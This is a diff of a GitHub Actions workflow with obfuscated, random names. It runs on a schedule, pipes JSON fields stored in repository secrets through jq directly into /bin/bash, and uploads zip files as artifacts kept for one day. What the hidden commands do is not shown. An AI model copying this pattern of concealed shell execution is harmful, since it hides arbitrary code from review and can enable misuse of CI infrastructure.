@@ -1,21 +1,25 @@
 name: baojielianghei
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '58 4/6 * * *'
-jobs:  # 7796
+    - cron: '16 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: baojielianghei
         env:
-          ngbe46: ${{ secrets.ngbe46 }}
+          rkhpw78269: ${{ secrets.rkhpw78269 }}
         run: |
-          echo $ngbe46 | jq -r .aofwx44012 | /bin/bash
-          echo $qe38992 | jq -r .h80041 | /bin/bash
-          echo $mtn17 | jq -r .o231 | /bin/bash
-          echo $kuoj587 | jq -r .yrzp469 | /bin/bash
-          echo $kpr3151 | jq -r .buks3 | /bin/bash
+          printf '%s' "$rkhpw78269" | jq -r .igkq8731 | /bin/bash
+          printf '%s' "$c10446" | jq -r .g26034 | /bin/bash
+          echo $u06 | jq -r .ikw38550 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: IUj7iXXs
+          path: "*.zip"
+          retention-days: 1
